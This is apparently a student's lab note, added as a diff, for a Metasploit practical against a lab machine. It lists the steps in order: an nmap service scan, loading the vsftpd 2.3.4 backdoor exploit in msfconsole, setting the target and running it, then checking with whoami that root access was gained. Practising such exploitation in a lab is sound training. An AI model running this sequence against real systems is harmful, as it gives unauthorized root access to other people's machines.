@@ -1,0 +1,13 @@
+###metasploit prac8
+sudo nmap -sV Ipofmetasploit
+
+(check the output we have to do ftp vsftpd later on)
+sudo msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor(if dont know this command type search vsftpd)
+show options
+set RHOSTS IPofmetasploit
+show options
+exploit
+whoami (if it says root that means u have got the root access of that machine and now u can see all files on it)
+
+ls -l
